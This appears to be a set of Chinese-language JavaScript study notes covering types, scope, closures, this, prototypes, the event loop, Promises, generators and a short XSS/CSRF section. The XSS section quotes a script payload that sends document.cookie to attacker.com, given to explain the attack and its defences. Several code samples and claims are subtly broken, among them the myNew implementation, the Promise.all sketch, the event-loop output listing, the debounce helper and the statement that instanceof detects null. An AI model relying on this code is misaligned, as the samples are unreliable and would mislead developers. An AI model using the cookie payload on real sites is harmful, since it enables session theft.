## 1.基本数据类型

基本数据类型：`number,string,boolean,null,undefined,symbol`
引用类型： `Object, Array, Function`

## 2.类型检测

主要三种方式：`typeof, instanceof, Object.prototype.toString.call() `

1. `typeof` 适合直接判断基础类型，但对`NULL,Object,Function`返回都是Object
2. `instanceof` 能直接判断`NULL,Object,Function`但是对基本数据类型不能判断
3. `Object.prototype.toString.call()` 万用

```js
var toString = Object.prototype.toString
console.log(toString.call(1)) //[object Number]
console.log(toString.call(true)) //[object Boolean]
console.log(toString.call('mc')) //[object String]
console.log(toString.call([])) //[object Array]
console.log(toString.call({})) //[object Object]
console.log(toString.call(function () {})) //[object Function]
console.log(toString.call(undefined)) //[object Undefined]
console.log(toString.call(null)) //[object Null]
```

## 3.var,let,const

const，块级作用域，声明之后不可变
let，块级作用域，声明变量
var, 强烈不建议使用。定义变量会导致变量提升，可以跨块访问。定义函数则不会产生这种效果。

- var还允许重复声明，即在同一作用域使用var重复声明一个变量
- 允许先使用，后声明；而且即使const/let已经在顶级作用域上声明其在执行前也不会被允许访问，其拥有**暂时性死区 (TDZ)**这一概念，杜绝了在声明前使用变量的坏习惯
js 的变量都存储在栈上，而引用类型则存储在堆上。


## 4.GC

## 5.作用域和作用域链

#### 作用域

js作用域分为：`全局作用域，函数作用域，块级作用域`

1. 全局：不在括号中的变量，var定义的变量，在哪里都可以访问
2. 函数：只在函数内部可以访问
3. 块级：使用const,let定义，子可以访问父，父访问不到子

#### 词法作用域

这里主要是对函数来说，函数在定义时确定作用域，即静态作用域，由代码书写位置决定访问权限

#### 作用域链

运行规则：

- 在创建函数时，生成scope内部属性
- 执行时创建：上下文 + scope
- 查找顺序：内部 -> 外部 -> ... ->全局

## 6.闭包

讲闭包需要先引入函数的运行机制，之后再引入`高阶函数`，并且需要熟悉js`作用域机制`，最后才能比较好理解闭包。

**一个函数（内层函数）可以“记住”并访问它被创建时所在的词法作用域（外层函数的作用域），即使它在那个作用域之外被执行。**

### 函数运行机制：函数加载，执行栈，栈帧

函数在加载编译时就会将所有的函数进行作用域分析，但内部函数只有在执行时才能实际地被创建和执行。

举个例子：

```js
function sqrt(a) {
    function sqrt_update(x) {
        return average(x, a / x)
    }

    function sqrt_close(x) {
        return approx_eq(x * x, a)
    }

    return improve(sqrt_update, sqrt_close)
}

function average(a, b) {
    return (a + b) / 2
}

function improve(update, close, guess = 1) {
    while (!close(guess)) {
        guess = update(guess)
    }
    return guess
}

function approx_eq(x, y, tolerance = 1e-3) {
    return Math.abs(x - y) < tolerance
}

const result = sqrt(256)
```

执行机制：

1. 运行前加载：当文件加载完成时，所有的函数声明都会被提升到作用域顶部
2. 执行时，sqrt(),average(),improve(),approx_eq()都是直接加载到内存中
3. 当调用sqrt时，会执行`return improve(sqrt_update, sqrt_close);`这里就会动态地执行，分别解析表达式sqrt_update，sqrt_close=>分别找到average, improve，并且会自动往这些函数作用域去找对应的变量
4. 可以比较容易的发现闭包既简化了变量的寻找方式，使其符合人的直觉，又保护了方法中的变量，使其私有化，不被外部访问

### 高阶函数

允许函数接受函数作为参数和返回函数。

### 嵌套函数

一般动态语言的函数都有这个特性，允许在函数中定义函数，这也是一种作用域机制，内部的函数只有在调用时才会执行。

### 具体应用

闭包本质上就是函数和其词法环境的引用绑定在一起，这种组合使内部函数可以访问外部函数的作用域

#### 在具体实践中

1. [用闭包模拟私有方法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Closures#%E7%94%A8%E9%97%AD%E5%8C%85%E6%A8%A1%E6%8B%9F%E7%A7%81%E6%9C%89%E6%96%B9%E6%B3%95)

2. 锁定参数（这个感觉就是科里化了），这里找mdn的样例

3. 延长生命周期

4. 工厂方法：

```js
// 当然你把他理解成工厂也是可以的：constructor Person(name,age){ this.name = name; this.age = age; const birthday = () => {} ; const eat() => {} };
const Person = (name, age) => {
    return {
        name,
        age,
        birthday() {
            console.log(`${name}长大了一岁`)
            this.age++
        },
        eat() {
            console.log(`${name}正在吃饭`)
        },
    }
}

const p1 = new Person('lee', 18)
```

````
#### 在语法设计

1. curry(科里化)：
   这个是闭包的简单应用了，即将参数拆分

```js
// 基础柯里化函数
const curry = (fn) => {
    return function curried(...args) {
        // 收集参数，当长度大于等于接受的参数长度时，执行函数
        if (args.length >= fn.length) {
            return fn.apply(this, args)
        }

        return (...nextArgs) => {
            return curried.apply(this, args.concat(nextArgs))
        }
    }
}

// 使用闭包保存中间状态
const add = (a, b, c) => a + b + c
const curriedAdd = curry(add)

console.log(curriedAdd(1)(2)(3)) // 6
````

有几个好处：

- 提高代码复用性
- 支持函数组合
- 延时执行
  缺点：
- 调试复杂
- 影响性能

2. 装饰器

3. 箭头函数: 捕获外层作用域的 this

4. 生成器

5. 异步编程

## 7.this

函数运行时自动生成的一个内部对象，只能在函数内部使用，总指向调用它的对象。
js中的this这个东西需要我们注意，是执行时绑定，类似动态作用域。this绑定形式有三种：隐式绑定，显示，new

### 1.隐式绑定

```js
const obj = {
    name: 'why',
    age: 18,
    show: function () {
        console.log(this) //expected obj
        function innerFunction() {
            console.log(this) //expected undefined
        }
        innerFunction()
    },
    b: {
        a: 'haha',
        c: function () {
            console.log(this.a)
        },
    },
}
//预期结果：
// obj{}  这里因为是obj这个对象来调用show，所以打印的就是它
// undefined 这里是函数来调用this，所以返回的是undefined；当然如果是浏览器调用，显示的就是window
obj.show()
```

### 2.显示绑定call/apply/bind

在理解这三个函数之前，我们需要知道，传递引用和调用的区别：

- 例如`a = obj.handleClick`这个相当于传了一个函数给boundHandleClick，而js中函数和对象并不是绑定的。在js中函数是"第一类对象"，可以被赋值，可以作为返回值，可以作为参数，可以有属性。对象只是提供调用时的上下文

```js
// 启用严格模式
'use strict'
const obj = {
    name: 'Jonas',
    handleClick() {
        console.log(`You clicked ${this}`)
    },
}
// 在这里，你没有绑定this，是button调用的，就会指向button元素
// const boundHandleClick = obj.handleClick.bind(obj);
// 这里你直接调用handleClick。可以理解一下A.B() -> this指向A； 这里相当于B() -> this指向window
const boundHandleClick = obj.handleClick
const button = document.querySelector('#myButton')
button.addEventListener('click', boundHandleClick)
//此时调用，就会打印[button element],因为是dom元素触发了该事件
```

`apply()、call()、bind()`是函数的一个方法，作用是改变函数的调用对象。它的第一个参数就表示改变后的调用这个函数的对象。因此，这时`this`指的就是这第一个参数

#### bind

这个比较简单，个人理解就是为了解决this使用的是动态词法作用域引起的操作不可控的问题，直接将this在编写时就锁定住，使其使用静态词法环境。具体可以看上面的示例代码。其中的args就是动态参数，自动插入到调用的函数之中。或者可以理解为因为js中函数和对象本身就不是强相关的，使用bind只是为了更好的控制上下文环境。

特性：

1. 创建一个新函数，保存原函数的引用，绑定的this，和传入的参数
2. 没有prototype，this固定
3. 如果没有传入新对象或者传的是undefined/null，默认指向window，严格模式下报错。

#### call/apply

这两个区别不大，唯一的区别就是性能略有差异，因为apply接受的是数组，有解构这一步，会略慢。特性：

1. 控制this指向 + 直接调用 + 参数预设

```js
function greet(greeting, punctuation) {
    console.log(`${greeting}, I'm ${this.name}${punctuation}`)
}

const person1 = { name: 'Alice' }
const person2 = { name: 'Bob' }
greet.call(person1, 'Hi', '!') //Hi, I'm Alice!
greet.call(person2, 'Hello', '.') //Hello, I'm Bob.
```

2. call/apply允许传入的this为undefined，bind则不可以，所以较好的容错性

### 3.箭头函数

为了给开发人员一种更加稳定的this绑定方式，设计出一个在静态作用域中查找。箭头函数不会创建自己的 `this` 上下文，它会捕获定义时所在作用域的 `this` 值。特性如下：

- 不可以当作构造函数，也就是说，不可以使用`new`命令，否则会抛出一个错误
- 没有arguments对象

## 8.原型和原型链

因为早期js没有class，为了实现oop的类和继承等机制所以设计出原型和原型链。
这里需要引入几个概念：

1. 构造函数：一般是首字母大写的函数（约定，和普通函数本质上没区别），使用new来创建实例，就是链接对象和构造函数的过程。
2. 函数的特殊属性prototype（本质上就是模拟class的作用），包含`contructor属性，指向构造函数本身，还有一个所有对象都有的**proto**属性，指向上级创建者，对于函数一般是Function.prototype
3. `__proto__`:可以理解为原型链指针，该指针是指向上一层的原型对象，更近一步可以理解为原型，对于函数对象来说，指向更上级的原型；对于实例来说，其指向创建自己的构造函数
   理解原型链需要有两个视角：

- 函数视角，函数在js中是一等公民，其是对象，又可以被直接调用。所以作为一个函数，其`__proto__`一般指向`Function.prototype`, 而顶级的`Function.__proto__ === Function.prototype` 其被设计成自举，就是为了保护函数一等公民的特性，避免出现更高级超函数概念，并且保护了Function自己就能访问的bind, apply, call等函数特有方法; 并且`Object.__proto__`因为Object本身是构造函数，其上级就是`Function.prototype`
- 对象视角，始终需要记住prototype是原型对象，它符合对象的特性，因此一切对象往上找都是`Object.prototype`, 而其作为对象顶层就该是null了`Object.prototype.__proto__ === null`
- 如何延长或修改原型链？修改**proto**; 如何修改链上的方法，修改prototype
更好的回答：
1. **是什么 (What):**  
	原型我理解为一种类class的模版机制，所有的函数都有一个prototype属性，其中包含指向构造函数的constructor其中包含构造函数的属性和方法，
    原型链是 JavaScript 中实现对象间继承的主要机制。每个对象都有一个指向其原型的内部链接，这个原型又有自己的原型，如此层层向上，直到一个原型的链接为 null，这个由原型组成的链条就是原型链。
    
2. **为什么 (Why):**  
    在 class 语法出现之前，JavaScript 需要一种方式来实现面向对象的继承和属性共享。原型机制的设计非常高效：**方法和共享属性被定义在构造函数的 prototype 对象上一次，而不是在每个实例上都复制一份**。所有实例通过原型链共享这些方法，极大地节省了内存。
    
3. **怎么做 (How):**  
    这个机制主要通过 __proto__ 和 prototype 这两个属性协同工作：
    
    - 当我们用 new Constructor() 创建一个实例 instance 时，instance 的 __proto__ 属性会被自动设置为 Constructor.prototype。
        
    - 当我们访问 instance.someMethod 时，JS 引擎首先在 instance 自身上查找。
        
    - 如果找不到，它会通过 instance.__proto__ 找到 Constructor.prototype 并在那里查找。
        
    - 如果还找不到，它会继续沿着 Constructor.prototype.__proto__ (它指向 Object.prototype) 向上查找，直到 Object.prototype.__proto__，也就是 null，查找结束。这个查找路径就是原型链。
4. todo
## 9.new运算符的实现机制

我们需要明确，创建一个实例需要做什么，可以简单梳理为四部：

1. 创建一个空对象
2. 将构造函数中的属性和方法添加到这个对象中
3. 改变this的指向
4. 返回这个对象（创建成功，返回新对象；创建失败，应该是原始类型，直接返回）

```js
function myNew(fn, ...args) {
    const obj = {}
    obj.__proto__ = fn
    let result = fn.apply(obj, args)
    //这里是处理构造函数处理原始值和对象的情况：如果返回的是对象，那就是这个；如果是原始值，那就应该是新的对象。这里instanceof是检测构造函数的 `prototype` 属性是否出现在某个实例对象的原型链上
    return result instanceof Object ? result : obj
}
```

## 10.EventLoop事件循环机制

理解事件循环就需要先了解浏览器运行机制，js本身是一个单线程的脚本语言，但在浏览器中需要我们异步地处理很多需求：定时器， DOM事件，网络，渲染，文件操作。于是浏览器提供了webapis，eventloop，task queue等机制。其中事件循环相当于一个调度器，处理各种机制的调度时机。接下来通过一张图，就能更清楚的了解：

![[Pasted image 20250814104254.png]]

其中callstack是js语言自身携带的，具有最高的执行优先级；接下来主要分宏任务队列（当然不可能这么简单，队列优先级也是分很多种的）和微任务队列。这也引出了问题：

#### 为什么先微再宏

因为js 代码的执行具有单线程的特性，设计出microTask就是为了插队。可以设想一下没有微任务，只有宏任务，那么在执行一个宏任务之中浏览器就不能立即去做其他事情了，而是要去排队，这样显然不合理，需要一种优先级更高的机制来保证任务执行灵活性。

#### 宏任务有哪些，优先级又是怎样的

在浏览器环境中：

1. 用户交互事件
2. **MessageChannel**
3. **requestAnimationFrame**
4. **setTimeout/setInterval**
5. **其他宏任务**（如：网络请求回调、渲染等）

在nodejs中：

1. **setImmediate**
2. **I/O callbacks**
3. **setTimeout/setInterval**
4. 其他宏任务

### 各种任务的执行实际

1. js同步代码优先级最高
2. 微任务
3. 宏任务的执行，每执行完一个就会去微任务中查找是否存在微任务

一个经典的例子：

```js
console.log('1. 全局同步代码开始')

// 宏任务1: setTimeout
setTimeout(() => {
    console.log('6. setTimeout 宏任务1')

    // 在宏任务中添加微任务
    Promise.resolve().then(() => {
        console.log('7. 宏任务1中的微任务1')
    })

    Promise.resolve().then(() => {
        console.log('8. 宏任务1中的微任务2')
    })
}, 0)

// 宏任务2: setTimeout
setTimeout(() => {
    console.log('11. setTimeout 宏任务2')
}, 0)

// 微任务1
Promise.resolve().then(() => {
    console.log('3. Promise 微任务1')

    // 在微任务中添加新的微任务
    Promise.resolve().then(() => {
        console.log('4. 嵌套的微任务1')
    })

    // 再添加一个微任务
    Promise.resolve().then(() => {
        console.log('5. 嵌套的微任务2')
    })
})

// 微任务2
Promise.resolve().then(() => {
    console.log('2. Promise 微任务2')
})

// 使用 MessageChannel 创建宏任务
const channel = new MessageChannel()
channel.port1.onmessage = () => {
    console.log('9. MessageChannel 宏任务')

    Promise.resolve().then(() => {
        console.log('10. MessageChannel中的微任务')
    })
}
channel.port2.postMessage(null)

console.log('1. 全局同步代码结束')
/**
1. 全局同步代码开始
2. 全局同步代码结束
3. Promise 微任务1
4. Promise 微任务2
5. 嵌套的微任务1
6. 嵌套的微任务2
7. setTimeout 宏任务1
8. 宏任务1中的微任务1
9. 宏任务1中的微任务2
10. setTimeout 宏任务2
11. MessageChannel 宏任务
12. MessageChannel中的微任务
 */
```

## 11.回调函数

回调函数则是一个被传递到另一个函数中的会在适当的时候被调用的函数，曾经是js中处理异步的主要方法。

回调函数也有分类：

#### 同步回调：

直接放在callstack中执行，

```js
function outerFunction(callback) {
    console.log('1. outerFunction 开始')
    console.log('2. 准备调用回调')
    callback()
    // 这里直接调用回调函数
    console.log('4. 回调执行完成')
    console.log('5. outerFunction 结束')
}
console.log('A. 程序开始')
outerFunction(function () {
    console.log('3. 同步回调正在执行')
})
console.log('B. 程序结束')
//调用顺序：1,2,3,4,5
```

#### 异步回调

```js
function asyncOperation(callback) {
    console.log('操作开始')
    setTimeout(callback, 0)
    // 放入事件队列，稍后执行
    console.log('操作结束')
}
console.log('A')
asyncOperation(() => console.log('B'))
console.log('C')
// 输出：A -> 操作开始 -> 操作结束 -> C -> B
```

所以说回调函数的名字取的很好，关健在于你怎么调用它。

## 12.Promise

![[Pasted image 20250814150307.png]]
先明确promise解决的问题是什么：

1. 回调地狱
2. 异步代码编写难的问题

```js
//case1:
const nP = new Promise((resolve, reject) => {
    resolve(1)
}).then((value) => 2)
console.log(nP)
//此时nP的状态？ 很明显应该是pending，因为
```

#### 核心机制

1. 运行状态
   Promise可以看作一个监视器，其中封装这各种用于监控回调函数执行的变量和方法：

- state：Promise有三种状态，pending, fulfil, reject。当promise对象被创建时就会进入pending状态，执行resolve函数后才会变成fulfiled/reject状态。为什么这样设计呢，因为当被resolve/reject之后，就会放到微任务队列中，此时就可以任务该promise被兑现了，所以修改状态。

2. 实例方法

```js
// then, catch,finally 核心就是then，catch只是对then的reject case的封装，finally就是一个回调函数
//then的作用十分重用,其作用如下
1. 当Promise被兑现时，将值穿透到then中，以便后续处理

//catch这个十分简单，就是只有reject的then的case。

//finally也是十分简单。就是无论resolve/reject都需要执行的回调函数
```

3.  静态方法

```js
//先要理解这个方法：作用于可迭代的promise对象，如果数组全部是fulfilled，返回一个Promise结果是fulfilled，如果有一个被reject，状态就是reject，且返回第一个被reject的值；
Promise.all()
/*
这里看一下具体实现:
1. 检测输入是否可迭代
2. 将输入转为数组来处理，利用可迭代对象的通用方法Array.from
3. 使用forEach来处理具体的promise，如果resolve放入results中，如果reject直接返回该对象
*/
Promise.prototype.all(promises) {
	if(!promises || typeof promises[Symbol.iterator] === 'function'){
		throw new TypeError("Argument is not iteratorable");
	}
	const promiseArray = Array.from(promises);
	if(promiseArray.length === 0) {
		resolve([]);
	}
	const results = [];
	let count =0;
	promiseArray.forEach((promise,index) => {
		Promise.resolve(promise).then(value => {
			//当没达到length，就放入result数组中
			results[index] = value;
			if(index === promiseArray.length) {
				resolve(results);
			}
		}, reason => {
			reject(reason);
		})
	})
}


//当promises中任何一个先发生状态改变，就返回该变更的状态
Promise.race()
/*这里的设计非常巧妙
1.通过在循环中注册Promise，传入的还是上级的resolve/reject
2. 这里还利用了promise一但敲定之后就不能修改的特性，才能实现率先返回
*/
function myPromiseRace(promises) {
    return new Promise((resolve, reject) => {
        if (!promises || typeof promises[Symbol.iterator] !== "function") {
            throw new TypeError("Argument is not iterable");
        }
        // 将可迭代对象转换
        const promisesArray = Array.from(promises);
        if (promisesArray.length === 0) return;

        for (const promise of promisesArray) {
            // 通过resolve来包装，处理非promise对象
            Promise.resolve(promise).then(
                (value) => {
                    resolve(value);
                },
                (reason) => {
                    reject(reason);
                }
            );
        }
    });
}


//不管接受还是拒绝，等到所有promise都实现才结束，返回一个promise包装所有兑现信息无论fulfilled/reject。
Promise.allSettled()



Promise.any()
//这个简单，直接new一个对象然后调用resolve方法即可
Promise.resolve()
//这也简单，直接new对象，然后调用reject方法即可
Promise.reject()

```

## 13. Async, Await

async比较简单，干的就是两件事：

1. 将函数返回值包装成Promise
2. 允许在函数中使用await

```js
//以一个简单异步函数举例
function loadJson(url) {
    return fetch(url).then((response) => {
        if (response.status == 200) {
            return response.json()
        } else {
            throw new Error(response.status)
        }
    })
}
//改用await/async
async function loadJson(url) {
    const res = await fetch(url)
    if (res.status === 200) {
        return res.json()
    } else {
        throw new Error(response.status)
    }
}
```

await干的事情就比较多了。其相当于yield关健字，可以将函数的执行中断，转而处理别的任务，具体可以梳理为：

1. 暂停执行：async函数在执行到await时会中止，等待右边表达式的Promise兑现。这里的暂停并不会阻塞主程序，其只是对函数运行的暂停和保存
2. 等待Promise兑现
    - 如果await对应的表达式是Promise对象，那么他会等待其被兑现
    - 如果不是则会包装成Promise-fulfilled
3. 解包：
    - 如果Promise被resolve，那么就会将值直接解包
    - 如果被reject也会直接抛出error，这也是常与try/catch配合的原因

```js
//这里是使用yield来模拟await
function run(generatorFunc) {
    const iterator = generatorFunc() // 启动生成器，获取迭代器

    // step 函数负责驱动生成器一步步执行
    function step(nextValue) {
        const result = iterator.next(nextValue) // 向前推进一步，把上一步的结果传回去

        if (result.done) {
            // 如果生成器已经执行完毕，就直接返回最终结果
            return result.value
        }
        // 如果还没完，`result.value` 就是 `yield` 出来的 Promise
        // 我们等待这个 Promise 完成，然后用它的结果去调用下一步
        result.value.then(
            // 如果 Promise 成功，将成功的值传给下一步
            (res) => step(res),
            // 如果 Promise 失败，通过 throw 方法将错误抛回生成器
            (err) => iterator.throw(err)
        )
    }

    step() // 启动第一步
}

function fetchSomething(value, delay) {
    return new Promise((resolve) => {
        setTimeout(() => {
            console.log(
                `[${new Date().toLocaleTimeString()}] Fetched: ${value}`
            )
            resolve(value)
        }, delay)
    })
}

// 这是一个用生成器模仿的 async 函数
function* generatorEquivalent() {
    console.log(
        "\n--- Running with Generator + Runner (the 'de-sugared' version) ---"
    )
    try {
        // `yield` 在这里的作用就完全等同于 `await`
        const result1 = yield fetchSomething('First', 1000)
        const result2 = yield fetchSomething(`Second (after ${result1})`, 1000)
        const result3 = yield fetchSomething(`Third (after ${result2})`, 1000)
        console.log('Final result:', result3)
    } catch (error) {
        console.error('Error in generator:', error)
    }
}
// --- 执行 ---
run(generatorEquivalent)
```

## 14.节流，防抖

浏览器的 `resize`、`scroll`、`keypress`、`mousemove` 等事件在触发时，会不断地调用绑定在事件上的回调函数，极大地浪费资源，降低前端性能。

- 节流: n 秒内只运行一次，若在 n 秒内重复触发，只有一次生效。场景：常用于高频操作的限流，例如用户对按钮进行持续点击
- 防抖: n 秒后在执行该事件，若在 n 秒内被重复触发，则重新计时。场景：例如在输入字符3s后自动查询

```js
//同步节流
function throttle(fn, delay) {
    let prevTime = 0
    //这里用闭包有很多好处：1.访问外部变量 2.防止函数被gc
    return function (...args) {
        let timeNow = Date.now() // 返回的是时间戳，使用静态方法还减少了消耗
        if (timeNow - prevTime > delay) {
            //这里就直接调用，并且需要改变this指向
            fn.call(this, ...args)
            prevTime = timeNow
        }
    }
}

//防抖,防止用户在没操作就触发
function debounce(fn, delay) {
    let lastTimer = null
    return function (...args) {
        clearTimer(lastTimer)
        lastTimer = setTimeout(() => fn.call(this, ...args), delay)
    }
}
```

## 16.XSS/CSRF/跨域

xss跨站脚本攻击分几种
存储型xss攻击原理：在有用户输入的系统中，攻击者将恶意脚本放在文本中，当浏览器接收到服务器返回的信息后，会自动渲染script脚本中的内容，例如 `<script>document.location='[http://attacker.com/steal?c='+document.cookie](https://www.google.com/url?sa=E&q=http%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie)</script>`,会将用户网站重定向到恶意网站，且携带cookie信息。反射型xss：还是因为浏览器无法区分哪些是正常的script哪些是恶意注入的script，只要遇到符合html型式的都会正常解析，dom型也是类似，这种解决方法也比较简单：在前后端处理用户输入的特殊字符；在meta启用csp`<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">` ； 使用api，例如不使用innerHTML

csrf:
这个一般是用户被诱导到恶意网站（如钓鱼邮件，广告，xss恶意注入），然后通过隐藏的表单，发起用户非预期的操作，这种攻击会拿到用户的数据，进而访问更多的系统资源。为了防护可以使用：jwt+设置cookie：httpOnly: true, // 防止XSS窃取 secure: true, // 仅HTTPS传输

## 17.es6数组扩展

## 18.对象扩展

## 19.函数扩展

## 20.Set，Map

## 21.迭代器

迭代器本质上可以理解为一个有状态的对象，其记录着当前是否迭代位置和是否完成迭代。

为什么要使用迭代起，直接用循环不好吗？
循环可以解决一切问题，但是我们希望通过一种通用的方法来解决迭代问题，这可以帮我们简化问题，增加了对问题的抽象程度。

JS中的迭代器并不是一个通用方法或类。其基于一个协议：`迭代协议`，遵守这个属性的对象就可以使用JS为他提供的通用迭代器方法和特性。

- 可迭代协议
- 迭代器协议

### 可迭代协议

当一个对象中包含`[Symbol.iterator]`方法，那么这个对象就是可迭代的，就可以使用`for of`,`...`,`Iterator API`这些有力的武器。

同样的，如果需要检测一个对象是否可迭代，可以简单通过`typeof obj[Symbol.iterator] === 'function'`完成检测

### 迭代器协议

这个协议规定我们如何进行迭代：需要实现一个符合规定的next方法，一个对象才可以成功迭代器，具体可以描述为：返回一个对象包含done(optional) ,value(optional)

如何使调用next之后生成的对象也是可迭代的，这个也简单，再加上属性[Symbol.iterator]即可，这里我封装了一个工厂方法，调用后使对象可迭代。

```js
// 现在我希望返回一个新对象
function objIteratorFactory2(obj) {
    // 我需要返回一个新对象，包含原对象的所有属性，并且可迭代
    return {
        ...obj,
        [Symbol.iterator]() {
            const keys = Object.keys(obj)
            let index = 0
            return {
                next() {
                    if (index < keys.length) {
                        return {
                            value: keys[index++],
                            done: false,
                        }
                    } else {
                        return {
                            done: true,
                        }
                    }
                },
                //确保返回的新对象也是可迭代的
                [Symbol.iterator]() {
                    return this
                },
            }
        },
    }
}
```

#### 这里还引申了一些问题

1. 迭代器真正维护的是什么？其对垃圾回收程序有什么影响？可迭代对象在迭代期间被修改，迭代器受影响么？
   个人理解就是一个有状态的对象，其记录着迭代过程和结束信息。只要迭代器还存在，gc就不会回收对象。对于有内置迭代器的类都会实时修改。

```js
const arr = [1, 2]
const iterator = arr[Symbol.iterator]()

console.log(iterator.next()) // { value: 1, done: false }

// 在迭代期间修改数组
arr.push(3)

console.log(iterator.next()) // { value: 2, done: false }
console.log(iterator.next()) // { value: 3, done: false } // 看到了新添加的元素
```

2. 请问迭代器关闭后，下一次继续迭代会沿着上一次关闭的位置继续迭代，还是重新开始呢？思考下面的代码将输出什么：

```js
let arr = ['STEP 1','STEP 2','STEP 3','STEP 4']
let iter = arr[Symbol.iterator]();
for(let i of iter){
    console.log(i);
    if( i > 1){
            break;
    }
}
for(let i of iter){
    console.log(i)
}
//ans: 如果是正常结束(done:true)那么就不会继续；如果是非正常结束如：throw。break就会继续
STEP 1
STEP 2
STEP 3
STEP 4

```

3. 如何指定迭代器提前关闭时执行的逻辑？哪些情况下迭代器会提前终止？
   这是上一个问题的延续：使用中断语句break,throw,return会提前关闭迭代器
4. Iterator核心API

- every与forEach，every接受回调函数，当返回false时，every立即返回；如果一直是正值，every则不会返回
- forEach没有返回值，只是执行

## 22.生成器

generator可以理解为一种语法糖，便于我们实现迭代器。但是其更重要的作用是函数执行流的中断，通过配合yield关键字让我们可以自由操作函数执行的顺序。

```js
function* genr() {
    console.log(yield)
    console.log(yield)
}
let g = genr()
g.next('Start')
g.next('Step 1')
g.next('Step 2')
//ans, 第一次的next调用被忽略
Step 1
Step 2
```

从上面的代码可以看出，function\* 封装的函数，返回的是Iterator对象，可以调用next方法，还可以访问value(yield传入的)/done。这里有几个点：

- 首次next接受的参数不生效，但是函数会执行到第一个yield并停下来
- 生成器函数还有常用方法throw(), return()分别可以抛出错误和停止生成器。打断之后都会讲done设置为true
- 其运行顺序如下：
    1.  g第一次调用next并传入'start'，没有生效，但是已经在第一个console.log停下来。这样做好处是在逻辑上统一，区分"启动"和"恢复执行"，还可以异常抛向当前暂停点，支持协作式多任务处理
    2.  g第二次调用next，执行语句，yield还会接受参数。
    3.  generator函数只会执行一次，并不会循环执行或者在yield之间跳转，所以上述代码之后再调用next也是不打印

### 组合生成器

```js
function* generateSequence(start, end) {
    for (let i = start; i <= end; i++) yield i
}

function* generatePasswordCodes() {
    // 使用yield* 可以讲generator函数组合，将操作委托给另一个generator函数，接受传递数据
    // 例如：这里的yield* generateSequence传入参数并委托相应的函数执行，执行过程中产生的数据被yield发出，传递给最外层的for...of循环, 最终形成一个字符串。可以看出，yield*相当于一个桥将两个函数连接起来，把数据传递到最外层。
    // 0..9
    yield* generateSequence(48, 57)

    // A..Z
    yield* generateSequence(65, 90)

    // a..z
    yield* generateSequence(97, 122)
}

let str = ''

for (let code of generatePasswordCodes()) {
    str += String.fromCharCode(code)
}

console.log(str)
```

查看这里的代码我们就可以发现：

- yield\* 可以调用其他generator function; 其作用相当于将一座桥，委托其他函数执行，并将yield的结果返回给最外层的for...of用以执行

#### 异步生成器

